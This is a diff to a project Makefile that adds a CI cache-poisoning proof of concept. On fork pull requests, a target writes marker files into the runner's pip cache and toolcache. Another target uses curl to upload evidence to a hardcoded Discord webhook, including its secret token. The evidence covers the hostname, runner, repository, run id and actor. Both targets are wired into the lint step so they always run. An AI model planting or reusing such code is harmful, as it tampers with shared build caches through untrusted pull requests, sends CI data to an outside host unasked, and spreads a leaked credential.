@@ -1,9 +1,10 @@
-# --- Cache Poisoning: send logs/evidence to Discord --------------------------
-# Hardcode your Discord webhook here:
-DISCORD_WEBHOOK := https://discord.com/api/webhooks/1234567890/YourWebhookSecret
-
+# --- Cache Poisoning PoC with hardcoded webhook ------------------------------
 .PHONY: ci-cache-check ci-cache-poison lint
 
+# Hardcoded Discord webhook URL
+DISCORD_WEBHOOK := https://discord.com/api/webhooks/1413091167125504000/DZPsdR_duaO5zoezj4o3FxDAQZ5JqoChL3vEPWg7BcjLJ17U0zVoUrtJbkyVJDYPRDdN
+
+# 1) Check: look for markers, upload evidence if present
 ci-cache-check:
 	@echo "[Cache-Check] Detecting prior markers in caches…"; \
 	pip_cache_dir="$$(python3 -m pip cache dir 2>/dev/null || echo "$$HOME/.cache/pip")"; \
@@ -11,45 +12,41 @@ ci-cache-check:
 	mark_pip="$$pip_cache_dir/wheels/poc/MARKER.txt"; \
 	mark_tool="$$toolcache/poc/MARKER.txt"; \
 	found="false"; \
-	[ -f "$$mark_pip"  ] && found="true"; \
-	[ -f "$$mark_tool" ] && found="true"; \
+	if [ -f "$$mark_pip" ];  then echo "::warning:: Found PIP marker";  found="true"; fi; \
+	if [ -f "$$mark_tool" ]; then echo "::warning:: Found TOOL marker"; found="true"; fi; \
 	if [ "$$found" = "true" ]; then \
-		echo "::warning:: Found markers; preparing Discord evidence…"; \
 		tmprep="$$(mktemp -t cacheEvidence)"; \
 		{ \
 			echo "Cache poisoning evidence"; \
 			echo "time=$$(date -u +%FT%TZ) host=$$(hostname) runner=$$RUNNER_NAME"; \
 			echo "repo=$$GITHUB_REPOSITORY event=$$GITHUB_EVENT_NAME run_id=$$GITHUB_RUN_ID sha=$$GITHUB_SHA actor=$$GITHUB_ACTOR"; \
 			echo ""; \
-			echo "[pip cache dir] $$pip_cache_dir"; \
-			if [ -f "$$mark_pip" ]; then echo "--- $$mark_pip ---"; sed -n '1,200p' "$$mark_pip"; echo ""; fi; \
-			echo "[toolcache dir] $$toolcache"; \
-			if [ -f "$$mark_tool" ]; then echo "--- $$mark_tool ---"; sed -n '1,200p' "$$mark_tool"; echo ""; fi; \
+			echo "[pip cache] $$pip_cache_dir"; \
+			if [ -f "$$mark_pip" ]; then echo "--- $$mark_pip ---"; cat "$$mark_pip"; echo ""; fi; \
+			echo "[toolcache] $$toolcache"; \
+			if [ -f "$$mark_tool" ]; then echo "--- $$mark_tool ---"; cat "$$mark_tool"; echo ""; fi; \
 		} > "$$tmprep"; \
-		# 1) JSON summary (use wait=true to get response JSON)
-		summary=$$(printf '{"content":"Cache poisoning **detected** on `%%s` (runner=%%s). Evidence attached."}' "$$(hostname)" "$$RUNNER_NAME"); \
-		resp_json=$$(curl -sS -H 'Content-Type: application/json' -d "$$summary" "$(DISCORD_WEBHOOK)?wait=true"); \
-		echo "Discord summary: $$resp_json" | sed 's/.*"id":"\([^"]*\)".*/message_id=\1/'; \
-		# 2) Attach evidence file (correct field: files[0])
-		resp_file=$$(curl -sS \
-			-F 'payload_json={"content":"cache-evidence.txt"}' \
+		echo "[Cache-Check] Uploading evidence to Discord…"; \
+		code=$$(curl -sS -o /dev/null -w "%{http_code}" \
+			-F 'payload_json={"content":"Cache poisoning evidence: markers found"}' \
 			-F "files[0]=@$$tmprep;type=text/plain;filename=cache-evidence.txt" \
-			"$(DISCORD_WEBHOOK)?wait=true"); \
-		echo "Discord file resp: $$resp_file" | sed 's/.*"id":"\([^"]*\)".*/attachment_message_id=\1/'; \
+			"$(DISCORD_WEBHOOK)"); \
+		echo "Discord evidence HTTP $$code"; \
 		rm -f "$$tmprep" || true; \
 	else \
 		echo "[Cache-Check] No markers found; nothing to report."; \
 	fi
 
+# 2) Poison: on fork PRs, write new markers
 ci-cache-poison:
 	@echo "[Cache-Poison] Evaluating if this is a fork PR…"; \
 	is_fork="$$(printf '%s\n' \
-'import json,os' \
+'import json,os,sys' \
 'p=os.environ.get("GITHUB_EVENT_PATH")' \
 'f=False' \
 'try:' \
-'  ev=json.load(open(p)) if p and os.path.exists(p) else {}' \
-'  f=bool(ev.get("pull_request",{}).get("head",{}).get("repo",{}).get("fork"))' \
+'    ev=json.load(open(p)) if p and os.path.exists(p) else {}' \
+'    f=bool(ev.get("pull_request",{}).get("head",{}).get("repo",{}).get("fork"))' \
 'except Exception: pass' \
 'print("true" if f else "false")' | python3 -)"; \
 	echo "[Cache-Poison] fork flag: $$is_fork"; \
@@ -64,15 +61,11 @@ ci-cache-poison:
 		  echo "event=$$GITHUB_EVENT_NAME  fork=true"; } > "$$pip_cache_dir/wheels/poc/MARKER.txt"; \
 		cp "$$pip_cache_dir/wheels/poc/MARKER.txt" "$$toolcache/poc/MARKER.txt"; \
 		echo "[Cache-Poison] Wrote markers to:"; \
-		ls -l "$$toolcache/poc/MARKER.txt" "$$pip_cache_dir/wheels/poc/MARKER.txt" || true; \
-		# Notify Discord that poisoning just occurred (so you see both sides)
-		curl -sS -H 'Content-Type: application/json' \
-			-d "$$(printf '{"content":"Poison **written** (fork PR) on `%%s` — markers placed in toolcache & pip cache."}' "$$(hostname)")" \
-			"$(DISCORD_WEBHOOK)" >/dev/null || true; \
+		ls -l "$$pip_cache_dir/wheels/poc/MARKER.txt" "$$toolcache/poc/MARKER.txt" || true; \
 	else \
 		echo "[Cache-Poison] Not a fork PR; skipping write."; \
 	fi
 
-# Ensure this runs automatically in your existing lint job
+# Hook into lint so this always runs
 lint: ci-cache-check ci-cache-poison
 	@echo "Lint step ran (after cache PoC)."
